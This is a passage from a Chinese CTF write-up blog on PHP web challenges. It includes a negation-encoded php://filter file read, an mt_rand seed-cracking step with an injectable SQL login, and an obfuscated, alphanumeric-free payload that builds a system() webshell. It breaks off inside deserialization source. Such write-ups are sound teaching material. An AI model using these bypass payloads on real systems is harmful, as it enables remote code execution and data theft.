class="language-none">require(php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;rea1fl4g.php);滤的太多了走取反绕过吧fl%61g[%61rg]&#x3D;&#125;require(~(%8F%97%8F%C5%D0%D0%99%96%93%8B%9A%8D%D0%8D%9A%9E%9B%C2%9C%90%91%89%9A%8D%8B%D1%9D%9E%8C%9A%C9%CB%D2%9A%91%9C%90%9B%9A%D0%8D%9A%8C%90%8A%8D%9C%9A%C2%8D%9A%9E%CE%99%93%CB%98%D1%8F%97%8F));&#x2F;&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">$f4ke_flag &#x3D; &quot;BJD&#123;1am_a_fake_f41111g23333&#125;&quot;;$rea1_f1114g &#x3D; &quot;flag&#123;4821ec92-8b00-4b72-b98c-4a7a296d9073&#125;&quot;;unset($rea1_f1114g);unset就离谱！！！！！！！！！！！！！！！！！！！！！！！！！！！<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>        <h2 id="GXYCTF2019-StrongestMind"   >          <a href="#GXYCTF2019-StrongestMind" class="heading-link"><i class="fas fa-link"></i></a><a href="#GXYCTF2019-StrongestMind" class="headerlink" title="[GXYCTF2019]StrongestMind"></a>[GXYCTF2019]StrongestMind</h2>      <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> re<span class="token keyword">import</span> timeurl<span class="token operator">=</span><span class="token string">"http://3dd7fedb-f52b-4054-a53e-07ea193a2b99.node4.buuoj.cn:81/index.php"</span>cookie<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"PHPSESSID"</span><span class="token punctuation">:</span><span class="token string">"f564584a331647033d332274c6bc3eb5"</span><span class="token punctuation">&#125;</span>tes<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>cookies<span class="token operator">=</span>cookie<span class="token punctuation">)</span><span class="token punctuation">.</span>texti<span class="token operator">=</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">r"\d+\s[\/|\+|\*|-]\s\d+"</span><span class="token punctuation">,</span>tes<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>tes<span class="token punctuation">)</span><span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'answer'</span><span class="token punctuation">:</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">eval</span><span class="token punctuation">(</span>i<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">&#125;</span>    tes<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>cookies<span class="token operator">=</span>cookie<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>text    i <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">r"\d+\s[\/|\+|\*|-]\s\d+"</span><span class="token punctuation">,</span> tes<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">"flag&#123;"</span> <span class="token keyword">in</span> tes<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>tes<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">r'ç¬¬ \d+ æ¬'</span><span class="token punctuation">,</span>tes<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>没了</p>        <h2 id="MRCTF2020-Ezaudit"   >          <a href="#MRCTF2020-Ezaudit" class="heading-link"><i class="fas fa-link"></i></a><a href="#MRCTF2020-Ezaudit" class="headerlink" title="[MRCTF2020]Ezaudit"></a>[MRCTF2020]Ezaudit</h2>      <p><span class="exturl"><a class="exturl__link"   href="http://www.zip拿源码/" >www.zip拿源码</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Content-type:text/html; charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'login'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$Private_key</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'Private_key'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$username</span> <span class="token operator">==</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token variable">$password</span> <span class="token operator">==</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">)</span> <span class="token operator">||</span><span class="token punctuation">(</span><span class="token variable">$Private_key</span> <span class="token operator">==</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// 若为空,视为未填写,提示错误,并3秒后返回登录界面</span>        <span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'refresh:2; url=login.html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"用户名、密码、密钥不能为空啦,crispr会让你在2秒后跳转到登录界面的!"</span><span class="token punctuation">;</span>        <span class="token keyword">exit</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$Private_key</span> <span class="token operator">!=</span> <span class="token string single-quoted-string">'*************'</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'refresh:2; url=login.html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"假密钥，咋会让你登录?crispr会让你在2秒后跳转到登录界面的!"</span><span class="token punctuation">;</span>        <span class="token keyword">exit</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$Private_key</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'************'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$getuser</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT flag FROM user WHERE username= 'crispr' AND password = '<span class="token interpolation"><span class="token variable">$password</span></span>'"</span><span class="token operator">.</span><span class="token string single-quoted-string">';'</span><span class="token punctuation">;</span>         <span class="token variable">$link</span><span class="token operator">=</span><span class="token function">mysql_connect</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"localhost"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"root"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"root"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">mysql_select_db</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"test"</span><span class="token punctuation">,</span><span class="token variable">$link</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$getuser</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token operator">=</span><span class="token function">mysql_fetch_assoc</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;tr>&lt;td>"</span><span class="token operator">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"username"</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;/td>&lt;td>"</span><span class="token operator">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"flag"</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;/td>&lt;td>"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token comment">// genarate public_key </span><span class="token keyword">function</span> <span class="token function-definition function">public_key</span><span class="token punctuation">(</span><span class="token variable">$length</span> <span class="token operator">=</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$strings1</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span><span class="token punctuation">;</span>    <span class="token variable">$public_key</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span> <span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$length</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span> <span class="token punctuation">)</span>    <span class="token variable">$public_key</span> <span class="token operator">.=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$strings1</span><span class="token punctuation">,</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$strings1</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$public_key</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token comment">//genarate private_key</span>  <span class="token keyword">function</span> <span class="token function-definition function">private_key</span><span class="token punctuation">(</span><span class="token variable">$length</span> <span class="token operator">=</span> <span class="token number">12</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$strings2</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span><span class="token punctuation">;</span>    <span class="token variable">$private_key</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span> <span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$length</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span> <span class="token punctuation">)</span>    <span class="token variable">$private_key</span> <span class="token operator">.=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$strings2</span><span class="token punctuation">,</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$strings2</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$private_key</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token variable">$Public_key</span> <span class="token operator">=</span> <span class="token function">public_key</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//$Public_key = KVQP0LdJKRaV3n9D  how to get crispr's private_key???</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>爆破种子</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">s <span class="token operator">=</span> <span class="token string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span>key <span class="token operator">=</span> <span class="token string">'KVQP0LdJKRaV3n9D'</span>m <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> key<span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> i <span class="token operator">==</span> s<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">:</span>            m <span class="token operator">+=</span> <span class="token string">"&#123;&#125; &#123;&#125; 0 &#123;&#125; "</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>j<span class="token punctuation">,</span>j<span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>爆破出种子为1775196155，服务器PHP版本为5.6.40，爆出private_key，admin加万能密码即可</p>        <h2 id="SUCTF-2018-GetShell"   >          <a href="#SUCTF-2018-GetShell" class="heading-link"><i class="fas fa-link"></i></a><a href="#SUCTF-2018-GetShell" class="headerlink" title="[SUCTF 2018]GetShell"></a>[SUCTF 2018]GetShell</h2>      <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$contents</span><span class="token operator">=</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$data</span><span class="token operator">=</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$contents</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$black_char</span> <span class="token keyword">as</span> <span class="token variable">$b</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"illegal char"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>     <span class="token punctuation">&#125;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>黑名单过滤测试后发现滤掉了所有数字和字母，用取反或异或绕过</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$_</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>             <span class="token comment">//array</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token operator">.</span><span class="token variable">$_</span><span class="token punctuation">;</span>         <span class="token comment">//arrayarray </span><span class="token variable">$__</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token variable">$_</span><span class="token operator">==</span><span class="token variable">$_</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//true，结果为1</span><span class="token keyword">echo</span> <span class="token operator">~</span><span class="token string single-quoted-string">'茉'</span><span class="token punctuation">[</span><span class="token variable">$__</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//s</span><span class="token keyword">echo</span> <span class="token operator">~</span><span class="token string single-quoted-string">'内'</span><span class="token punctuation">[</span><span class="token variable">$__</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//y</span><span class="token keyword">echo</span> <span class="token operator">~</span><span class="token string single-quoted-string">'茉'</span><span class="token punctuation">[</span><span class="token variable">$__</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//s</span><span class="token keyword">echo</span> <span class="token operator">~</span><span class="token string single-quoted-string">'苏'</span><span class="token punctuation">[</span><span class="token variable">$__</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//t</span><span class="token keyword">echo</span> <span class="token operator">~</span><span class="token string single-quoted-string">'的'</span><span class="token punctuation">[</span><span class="token variable">$__</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//e</span><span class="token keyword">echo</span> <span class="token operator">~</span><span class="token string single-quoted-string">'咩'</span><span class="token punctuation">[</span><span class="token variable">$__</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//m</span><span class="token keyword">echo</span> <span class="token operator">~</span><span class="token string single-quoted-string">'课'</span><span class="token punctuation">[</span><span class="token variable">$__</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//P</span><span class="token keyword">echo</span> <span class="token operator">~</span><span class="token string single-quoted-string">'尬'</span><span class="token punctuation">[</span><span class="token variable">$__</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//O</span><span class="token keyword">echo</span> <span class="token operator">~</span><span class="token string single-quoted-string">'笔'</span><span class="token punctuation">[</span><span class="token variable">$__</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//S</span><span class="token keyword">echo</span> <span class="token operator">~</span><span class="token string single-quoted-string">'端'</span><span class="token punctuation">[</span><span class="token variable">$__</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//T</span><span class="token keyword">echo</span> <span class="token operator">~</span><span class="token string single-quoted-string">'瞎'</span><span class="token punctuation">[</span><span class="token variable">$__</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//a</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在这里可以这么使用是因为UTF-8编码在编码汉字时实际上是使用了三个单字符拼接编码的，使用[]即可取出中间的一个字符，再对这个字符进行取反操作，就可能能打印出我们想要的字符</p><p>最终payload：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">.=</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token variable">$____</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token operator">==</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token operator">=</span><span class="token operator">~</span>茉<span class="token punctuation">[</span><span class="token variable">$____</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token operator">.=</span><span class="token operator">~</span>内<span class="token punctuation">[</span><span class="token variable">$____</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token operator">.=</span><span class="token operator">~</span>茉<span class="token punctuation">[</span><span class="token variable">$____</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token operator">.=</span><span class="token operator">~</span>苏<span class="token punctuation">[</span><span class="token variable">$____</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token operator">.=</span><span class="token operator">~</span>的<span class="token punctuation">[</span><span class="token variable">$____</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token operator">.=</span><span class="token operator">~</span>咩<span class="token punctuation">[</span><span class="token variable">$____</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$_____</span><span class="token operator">=</span><span class="token constant">_</span><span class="token punctuation">;</span><span class="token variable">$_____</span><span class="token operator">.=</span><span class="token operator">~</span>课<span class="token punctuation">[</span><span class="token variable">$____</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$_____</span><span class="token operator">.=</span><span class="token operator">~</span>尬<span class="token punctuation">[</span><span class="token variable">$____</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$_____</span><span class="token operator">.=</span><span class="token operator">~</span>笔<span class="token punctuation">[</span><span class="token variable">$____</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$_____</span><span class="token operator">.=</span><span class="token operator">~</span>端<span class="token punctuation">[</span><span class="token variable">$____</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$__________</span><span class="token operator">=</span><span class="token variable">$$_____</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token punctuation">(</span><span class="token variable">$__________</span><span class="token punctuation">[</span><span class="token operator">~</span>瞎<span class="token punctuation">[</span><span class="token variable">$____</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>        <h2 id="GYCTF2020-Easyphp"   >          <a href="#GYCTF2020-Easyphp" class="heading-link"><i class="fas fa-link"></i></a><a href="#GYCTF2020-Easyphp" class="headerlink" title="[GYCTF2020]Easyphp"></a>[GYCTF2020]Easyphp</h2>      <p>反序列化，<span class="exturl"><a class="exturl__link"   href="http://www.zip拿源码/" >www.zip拿源码</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><pre class="line-numbers language-php" data-language="php"><code class="language-php">//lib.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">safe</span><span class="token punctuation">(</span><span class="token variable">$parm</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$array</span><span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'union'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'regexp'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'load'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'into'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'insert'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"'"</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\\'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"*"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"alter"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token variable">$array</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">,</span><span class="token variable">$parm</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">User</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$id</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$age</span><span class="token operator">=</span><span class="token constant">null</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$nickname</span><span class="token operator">=</span><span class="token constant">null</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$mysqli</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">dbCtrl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">id</span><span class="token operator">=</span><span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token function">login</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'select id,password from user where username=?'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">id</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">id</span><span class="token punctuation">;</span>        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'login'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"你的ID是"</span><span class="token operator">.</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"你好！"</span><span class="token operator">.</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'token'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;script>window.location.href='./update.php'&lt;/script>"</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">id</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">update</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$Info</span><span class="token operator">=</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token function">getNewinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$age</span><span class="token operator">=</span><span class="token variable">$Info</span><span class="token operator">-></span><span class="token property">age</span><span class="token punctuation">;</span>        <span class="token variable">$nickname</span><span class="token operator">=</span><span class="token variable">$Info</span><span class="token operator">-></span><span class="token property">nickname</span><span class="token punctuation">;</span>        